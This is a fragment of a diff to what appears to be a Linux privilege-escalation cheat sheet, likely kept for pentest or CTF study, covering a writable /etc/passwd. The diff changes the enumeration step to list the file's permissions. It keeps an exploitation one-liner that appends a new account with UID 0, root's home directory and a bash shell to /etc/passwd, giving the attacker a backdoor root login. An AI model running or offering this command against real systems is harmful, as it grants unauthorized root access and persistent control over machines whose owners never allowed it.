@@ -36,13 +36,12 @@ https://gtfobins.github.io/
 ### Passwd Writabble
 #### Enumeration  
 ```
-find / -writable -type d 2>/dev/null
+ls -la /etc/passwd
 ```
 #### Exploitation  
 ```
 echo "okays:$(openssl passwd okay2):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
 ```
-
 
 ### Enumeration Automated
 
